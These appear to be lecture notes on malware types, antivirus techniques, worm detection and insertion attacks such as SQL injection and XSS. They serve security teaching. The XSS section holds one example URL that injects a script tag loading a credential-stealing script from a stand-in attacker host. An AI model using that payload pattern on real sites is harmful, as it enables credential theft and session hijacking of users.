# Malicious Programs
- Software threats to computer systems:
  - Malicious programs that exploit vulnerabilities in computer systems to launch attacks on security and privacy
  - Continuous development of new types of malicious programs and countermeasures
- Important features: propagation and self-replication
- Vulnerabilities in computer systems are almost inevitable due to their immense complexity

## Historical Context
- Creeper (BBN, Bob Thomas, 1971): probably the first computer virus
- Reaper (BBN, Ray Tomlinson, soon after): a self-replicating and self-propagating program chasing Creeper to log it out (first antivirus)
- Cyber arms race has started

## Taxonomy of Malicious Programs
- Trapdoors/backdoors
- Logic bombs
- Trojan horses
- Zombies
- Viruses
- Worms

### Trapdoors/Backdoors
- Secret entry point into a program that allows someone aware of the trapdoor to gain access without going through the usual security procedures
- May be used legitimately during debugging and testing
- Become threats when used to gain unauthorized access

#### Ken's Trapdoor
- Ken Thompson, in his Turing Award Lecture (1984):
  - Example of a trapdoor: modifying a C compiler to make a trapdoor almost impossible to find
  - "Moral is obvious. You can't trust code that you did not totally create yourself"

### Logic Bomb
- Code embedded in a legitimate program that is set to explode when certain conditions are met
  - Presence or absence of certain files, particular day of the week or date, particular user running the application
- Once triggered, a bomb may alter or delete data, cause machine halt, etc.
- Example: Tim Lloyd case (1996), causing more than 10 million dollars in damage

### Trojan Horses
- A useful (or apparently useful) program containing hidden code that, when invoked, performs some unwanted or harmful function
- Thompson example: a compiler as a Trojan Horse, very difficult to discover
- Recent example: Zeus trojan (2007-present), infecting millions of computers

### Zombies
- A program that secretly takes over another Internet-attached computer and uses it to launch attacks that are difficult to trace to the zombie's creator
- May be used in denial-of-service attacks or sending spam messages
- Large orchestrated collections of zombies are usually referred to as botnets
- Example: BredoLab botnet (2009-2010), infecting over 30 million computers

### Viruses
- A program that can "infect" other programs by modifying them
- The modification includes a copy of the virus program, which can then go on to infect other programs
- A virus attaches itself to another program and executes secretly when the host program is run

#### Typical Virus Phases
1. Dormant phase: the virus is idle
2. Propagation phase: the virus places an identical copy of itself into other programs or system areas on the disk
3. Triggering phase: the virus is activated to perform its intended function
4. Execution phase: the function is performed

#### Theoretical Analysis
- Fred Cohen (1980s-90s):
  - Theoretical analyses of viral mechanisms
  - First formal definition of computer viruses
  - Undecidability theorem: in general, the problem of detecting viruses is undecidable

#### Types of Viruses
- Parasitic virus: attaches itself to executable files and replicates when the infected program is executed
- Memory-resident virus: lodges in main memory as part of a resident system program and infects every program that executes
- Boot sector virus: infects a boot record and spreads when a system is booted from the disk containing the virus
- Stealth virus: designed to hide itself from detection
- Polymorphic virus: mutates with every infection, making detection by "signature" impossible
- These types are not mutually exclusive

#### Macro Viruses and E-mail Viruses
- Macro viruses take advantage of the macro feature found in Word and other office applications
- A macro is an executable program embedded in a word processing document or other type of file
- Auto-executing macros, invoked without explicit user input, make it possible to create a macro virus
- Macro viruses are easily spread, commonly via electronic mail
- Example: Melissa virus (1999), a macro virus spread via e-mail using an MS Word macro embedded in an attachment

### Worms
- Network worm programs actively use network connections to spread from system to system, often without user participation
- Typically use electronic mail facility, remote execution capability, or remote login capability
- In 2005, worms propagating via instant messengers (MSN Messenger, AOL Messenger, etc.) emerged
- Example: Morris Worm (1988), distributed via the Internet by Robert Morris
  - Not intended to cause harm, but to highlight security flaws
  - Damage caused by excessive replication, making many infected systems unusable
  - Estimated cost of damage: $100,000 to $10,000,000
  - Thousands of computers were down for days, and the Internet was partitioned for a few days while regional networks were cleaned
  - United States v. Morris: Robert Morris was tried and convicted under the Computer Fraud and Abuse Act

## Antivirus Approaches
1. Prevention: do not allow a virus to get into the system (generally impossible to achieve)
2. Detection: once infection has occurred, determine that it has occurred and locate the virus
3. Identification: once a virus is detected, identify it
4. Removal: once the specific virus has been identified, remove all traces of the virus and restore the infected programs to their original states

### Generations of Antivirus Software
1. First generation: simple scanners
2. Second generation: heuristic scanners
3. Third generation: activity traps
4. Fourth generation: full-featured protection

#### Simple Scanners
- Require a virus signature to identify a virus
- May detect viruses that have essentially the same structure and bit patterns in all copies
- Limited to the detection of known viruses
- May maintain a record of program lengths and look for changes

#### Heuristic Scanners
- Rely on heuristic rules to search for probable virus infection
- May look for fragments of code often associated with viruses (e.g., encryption loop and key in polymorphic viruses)
- May use integrity checking (simple checksum or encrypted hash functions)

#### Activity Detection
- Memory-resident programs that identify a virus by its actions at runtime rather than by its signature or structure
- Not necessary to develop signatures and heuristics for various classes of viruses
- Necessary to identify a small set of indicative actions

#### Fourth-Generation Antivirus Packages
- Packages consisting of a variety of antivirus techniques used together (scanning, activity trap, control capability, etc.)
- Usually combined with other security defense systems (IDS, firewalls, etc.)

### Generic Decryption and Simulation
- Polymorphic viruses use encryption to hide malicious code
- To execute, the code must be decrypted
- Generic decryption (GD) tools detect (fragments of) viruses at the stage when they are decrypted and ready to be executed
- CPU simulator is used for this purpose
- GD tools contain:
  - CPU simulator: a software-based virtual computer that interprets instructions in an executable file without affecting the underlying processor
  - Virus signature scanner: a module that scans the code looking for signatures of known viruses
  - Emulation control module: controls the execution of the target code, switching between simulation and scanning modes

### Behavior-Blocking Software
- Integrates with the operating system of the host computer and monitors program behavior in real-time for malicious actions
- Blocks potentially malicious actions before they affect the system
- Potentially malicious actions may include attempts to open, view, delete, or modify files; attempts to format disk drives; modification of system settings; initiation of network communication, etc.

## Monitoring and Detection of Internet Worms
- Speed is crucial:
  - SQL Slammer worm (January 2003) infected more than 90% of vulnerable computers on the Internet within 10 minutes
  - Successful worm attacks typically last several days, infecting hundreds of thousands of computers (Code Red, Nimda, Blaster, etc.)
- Aim: early detection

### Worm Monitoring System
- Consists of:
  - Local scan monitors for incoming and outgoing traffic
  - Data mixers gathering information from monitors or other data mixers (located at lower levels in a tree structure)
  - Warning center accumulating information about the whole network and performing detection

### Worm Detection
- The range of methods developed for Intrusion Detection Systems can be used for worm detection
- Special role of anomaly detection systems (suitable for detecting unknown worms):
  - Threshold-based: detection of bursts in network traffic
  - Trend-based: detection of trends in network traffic, based on the fact that worms propagate exponentially in early stages

## Categories of Attacks: Insertion Attacks
- On data-driven and web applications:
  - SQL injection
  - Cross-site scripting (XSS)

### SQL Injection
- An instance of insertion attacks
- Main target: data-driven applications
- Mostly used for database-backed websites but can be used to attack any type of SQL database
- Most frequently occur when queries are constructed from user inputs
- Example:
  - Simple SQL query: `SELECT data FROM table WHERE field = '$INPUT';`, where `$INPUT` is user input
  - Malformed or smartly designed input allows performing unintended actions (e.g., returning all data from the table or deleting a table)

#### SQL Injection Countermeasures
- Input type checking/input sanitizing
- Positive pattern matching (only "good" strings allowed)
- Avoid dynamic SQL use
- Parameterized queries (prepared statements) that pre-compile SQL statements (only values for parameters need to be supplied for execution)
- Penetration testing

### Cross-Site Scripting (XSS)
- Another instance of insertion attacks
- Typical context: HTML code displays input from the user (e.g., in a search system)
- If the input includes scripting tags, the browser can be tricked into executing a script provided by the user
- Example: `http://searchsite.org/search?q=something<script%20src="http://malicioussite.com/authstealer.js"></script>`
- Can be used for stealing user credentials or hijacking web sessions via executing the scripts originated by the attacker

#### XSS Countermeasures
- Similar to SQL injection countermeasures
- Sanitize the input by replacing symbols that instruct the browser to interpret input as executable instructions with symbols ignored by the browser
- Example of an XSS vulnerable website for testing: `http://www.insecurelabs.org/Task`

Malicious software poses significant threats to computer systems and networks. Understanding the various types of malicious programs, their propagation methods, and potential impacts is crucial for developing effective countermeasures. Antivirus software has evolved over time to incorporate techniques such as scanning, heuristic analysis, activity detection, and behavior blocking. Monitoring and early detection of internet worms are essential due to their rapid propagation. Insertion attacks, such as SQL injection and cross-site scripting, target web applications and can be mitigated through input validation and sanitization. A multi-layered approach combining prevention, detection, and response is necessary to combat the ever-evolving landscape of malicious software and cyberattacks.